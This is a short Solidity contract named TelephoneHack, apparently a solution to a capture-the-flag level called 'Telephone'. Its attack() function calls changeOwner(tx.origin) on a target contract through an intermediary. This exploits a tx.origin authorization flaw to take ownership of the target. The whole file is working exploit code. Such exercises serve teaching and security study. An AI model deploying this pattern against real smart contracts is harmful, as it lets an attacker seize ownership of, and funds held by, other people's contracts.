// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    address telephone;

    constructor(address telephone_) {
        telephone = telephone_;
    }

    function attack() public {
        ITelephone(telephone).changeOwner(tx.origin);
    }
}
